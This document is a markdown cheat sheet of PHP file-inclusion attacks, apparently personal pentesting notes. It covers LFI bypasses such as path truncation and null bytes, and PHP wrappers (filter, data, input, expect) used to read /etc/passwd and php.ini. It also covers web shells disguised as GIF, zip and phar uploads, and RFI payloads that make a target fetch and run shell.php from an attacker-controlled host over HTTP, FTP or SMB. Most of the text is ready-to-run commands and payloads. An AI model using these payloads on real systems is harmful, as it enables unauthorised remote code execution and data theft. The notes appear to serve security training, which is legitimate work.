```

**Some Bypass**
[[command-injection#Bypass]]

_Approved Path_
Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
## Appended Extensions
### Path Truncation 
 They are `obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4`.

In earlier versions of PHP, defined strings have a maximum length of 4096 characters.
If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`). Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work.

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

_Build Payload_
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
### Null Bytes
PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.
```url
/etc/passwd%00
```

## PHP Wrappers
#php #lfi #wrappers
### Filter Wrappers
There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php).
But the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.
#### Source Code Disclosure
```url
php://filter/read=convert.base64-encode/resource=<file to read>
```

> [!NOTE] **Note**
> We intentionally left the resource file at the end of our string, as the `.php` extension is automatically appended to the end of our input string, which would make the resource we specified be `config.php`.
### Data Wrappers
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.
#### Checking PHP Configurations
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
_Example_
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
_Find what you want to control_
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

`allow_url_include` option can be very important, as `this option is not enabled by default`, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack.
#### Remote Code Execution
Our first step would be to `base64` encode a basic PHP web shell, as follows.
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:
```url
?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
OR
```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
### Input Wrappers
Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
### Expect Wrappers
Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

#### Check if is installed on a back-end
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

We can use the `expect://` wrapper and then pass the command we want to execute, as follows:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
## File Upload via LFI
#file-upload #lfi 
If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type.
### Crafting Malicious Image
So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well.
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file.
### Zip Upload
#wrappers #php
We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar Upload
To use  `phar://`, we will first write the following PHP script into a `shell.php` file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
# RFI
#rfi
In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.

_Guide to do that_
[[local-file-inclusion#Checking PHP Configurations]]

At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included:
```url
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

_Path for perform RFI_
## Build Paylod
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
## Serve Payload
### Via HTTP
```bash
sudo python3 -m http.server <LISTENING_PORT>
```

> [!NOTE] NOTE
> It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

_Inject payload_
```url
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
OR
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id'
```
### Via FTP
```bash
sudo python -m pyftpdlib -p 21
```

_Inject payload_
```url
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
OR
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```
### Via SMB
#windows #rfi
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion.

We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
```bash
impacket-smbserver -smb2support share $(pwd)
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:
```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
